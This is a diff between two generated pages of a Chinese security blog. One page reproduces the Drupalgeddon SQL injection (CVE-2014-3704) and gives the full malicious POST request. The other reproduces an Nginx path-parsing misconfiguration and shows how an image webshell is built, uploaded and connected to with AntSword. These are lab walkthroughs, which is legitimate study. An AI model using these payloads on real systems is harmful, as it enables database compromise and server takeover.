@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Drupal < 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）,">
+  <meta name="keywords" content="Nginx 解析漏洞复现,">
 
 
 
@@ -79,21 +79,27 @@
 
 
 
-<meta name="description" content="Drupal &amp;lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）Drupal 是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码。&amp;emsp;访问靶机IP打开bp抓包  并发送以下数据包&amp;emsp;POST /?q=node&amp;amp;destin">
-<meta name="keywords" content="Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）">
+<meta name="description" content="Nginx 解析漏洞复现版本信息：Nginx 1.x 最新版PHP 7.x最新版由此可知，该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。直接执行docker-compose up -d启动容器，无需编译。访问http://your-ip/uploadfiles/nginx.png和http://your-ip/uploadfiles/nginx.png/.php即可查看效果">
+<meta name="keywords" content="Nginx 解析漏洞复现">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）">
-<meta property="og:url" content="http://yoursite.com/2019/07/26/ld (11)/index.html">
+<meta property="og:title" content="Nginx 解析漏洞复现">
+<meta property="og:url" content="http://yoursite.com/2019/07/28/ld (14)/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Drupal &amp;lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）Drupal 是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码。&amp;emsp;访问靶机IP打开bp抓包  并发送以下数据包&amp;emsp;POST /?q=node&amp;amp;destin">
+<meta property="og:description" content="Nginx 解析漏洞复现版本信息：Nginx 1.x 最新版PHP 7.x最新版由此可知，该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。直接执行docker-compose up -d启动容器，无需编译。访问http://your-ip/uploadfiles/nginx.png和http://your-ip/uploadfiles/nginx.png/.php即可查看效果">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://s2.ax1x.com/2019/08/15/mEilGj.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/08/15/mEiUdU.png">
-<meta property="og:updated_time" content="2019-08-15T06:36:00.192Z">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/15/mEEl7V.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/15/mEE8tU.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/15/mEEw0x.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/15/mEEWnI.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/15/mEEo4S.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/15/mEEjH0.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/15/mEVYUf.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/15/mEVa8g.png">
+<meta property="og:updated_time" content="2019-08-15T06:57:44.941Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）">
-<meta name="twitter:description" content="Drupal &amp;lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）Drupal 是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码。&amp;emsp;访问靶机IP打开bp抓包  并发送以下数据包&amp;emsp;POST /?q=node&amp;amp;destin">
-<meta name="twitter:image" content="https://s2.ax1x.com/2019/08/15/mEilGj.png">
+<meta name="twitter:title" content="Nginx 解析漏洞复现">
+<meta name="twitter:description" content="Nginx 解析漏洞复现版本信息：Nginx 1.x 最新版PHP 7.x最新版由此可知，该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。直接执行docker-compose up -d启动容器，无需编译。访问http://your-ip/uploadfiles/nginx.png和http://your-ip/uploadfiles/nginx.png/.php即可查看效果">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/08/15/mEEl7V.png">
 
 
 
@@ -123,13 +129,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/07/26/ld (11)/">
+  <link rel="canonical" href="http://yoursite.com/2019/07/28/ld (14)/">
 
 
 
 
 
-  <title>Drupal < 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704） | Hexo</title>
+  <title>Nginx 解析漏洞复现 | Hexo</title>
   
 
 
@@ -236,7 +242,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (11)/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/28/ld (14)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -253,7 +259,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Drupal < 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）</h1>
+          <h1 class="post-title" itemprop="name headline">Nginx 解析漏洞复现</h1>
         
 
         <div class="post-meta">
@@ -265,8 +271,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-26T09:16:18+08:00">
-                2019-07-26
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-28T09:16:18+08:00">
+                2019-07-28
               </time>
             
 
@@ -304,7 +310,7 @@
 
       
         <hr>
-<h1 id="Drupal-lt-7-32-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）"><a href="#Drupal-lt-7-32-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）" class="headerlink" title="Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）"></a>Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）</h1><p>Drupal 是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码。<br>&emsp;<br>访问靶机IP<br><a href="https://imgchr.com/i/mEilGj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEilGj.png" alt="mEilGj.png"></a><br>打开bp抓包  并发送以下数据包<br>&emsp;<br>POST /?q=node&amp;destination=node HTTP/1.1<br>Host: your-ip:8080<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 120<br>&emsp;<br>pass=lol&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in&amp;name[0 or<br>updatexml(0,concat(0xa,user()),0)%23]=bob&amp;name[0]=a<br>&emsp;<br>可见，信息已被爆出<br><a href="https://imgchr.com/i/mEiUdU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEiUdU.png" alt="mEiUdU.png"></a></p>
+<h1 id="Nginx-解析漏洞复现"><a href="#Nginx-解析漏洞复现" class="headerlink" title="Nginx 解析漏洞复现"></a>Nginx 解析漏洞复现</h1><p>版本信息：<br>Nginx 1.x 最新版<br>PHP 7.x最新版<br>由此可知，该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。<br>直接执行docker-compose up -d启动容器，无需编译。<br>访问<a href="http://your-ip/uploadfiles/nginx.png和http://your-ip/uploadfiles/nginx.png/.php即可查看效果。" target="_blank" rel="noopener">http://your-ip/uploadfiles/nginx.png和http://your-ip/uploadfiles/nginx.png/.php即可查看效果。</a><br><a href="https://imgchr.com/i/mEEl7V" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEl7V.png" alt="mEEl7V.png"></a><br>增加/.php后缀，被解析成PHP文件：<br><a href="https://imgchr.com/i/mEE8tU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEE8tU.png" alt="mEE8tU.png"></a><br>通过测试可以看出这就是传说中的nginx解析漏洞：在/nginx.png后加/.php会将nginx.png当成php解析<br>然后浏览器访问 <a href="http://192.168.199.173/index.php，来测试一下上传功能，这里通过命令行执行copy" target="_blank" rel="noopener">http://192.168.199.173/index.php，来测试一下上传功能，这里通过命令行执行copy</a> lq.jpg/b+shell.php/a zzz.jpg，生成并上传图片马：<br><a href="https://imgchr.com/i/mEEw0x" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEw0x.png" alt="mEEw0x.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mEEWnI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEWnI.png" alt="mEEWnI.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mEEo4S" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEo4S.png" alt="mEEo4S.png"></a><br>现在通过浏览器访问，查看是否成功上传并解析：<br><a href="https://imgchr.com/i/mEEjH0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEEjH0.png" alt="mEEjH0.png"></a><br>解析成功！<br>接下来通过蚁剑进行连接图片马，将图片马成功的解析路径作为蚁剑的连接路径：<br><a href="https://imgchr.com/i/mEVYUf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEVYUf.png" alt="mEVYUf.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mEVa8g" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEVa8g.png" alt="mEVa8g.png"></a><br>成功！</p>
 
       
     </div>
@@ -322,7 +328,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Drupal-7-32-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）/" rel="tag"># Drupal < 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）</a>
+            <a href="/tags/Nginx-解析漏洞复现/" rel="tag"># Nginx 解析漏洞复现</a>
           
         </div>
       
@@ -335,8 +341,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/07/26/ld (10)/" rel="next" title="DNS域传送漏洞">
-                <i class="fa fa-chevron-left"></i> DNS域传送漏洞
+              <a href="/2019/07/27/ld (12)/" rel="next" title="Drupal Drupalgeddon 2远程执行代码漏洞（CVE-2018-7600）">
+                <i class="fa fa-chevron-left"></i> Drupal Drupalgeddon 2远程执行代码漏洞（CVE-2018-7600）
               </a>
             
           </div>
@@ -344,10 +350,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/07/27/ld (13)/" rel="prev" title="Drupal远程代码执行漏洞（CVE-2018-7602）">
-                Drupal远程代码执行漏洞（CVE-2018-7602） <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -470,7 +472,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Drupal-lt-7-32-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）"><span class="nav-number">1.</span> <span class="nav-text">Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Nginx-解析漏洞复现"><span class="nav-number">1.</span> <span class="nav-text">Nginx 解析漏洞复现</span></a></li></ol></div>
             
 
           </div>
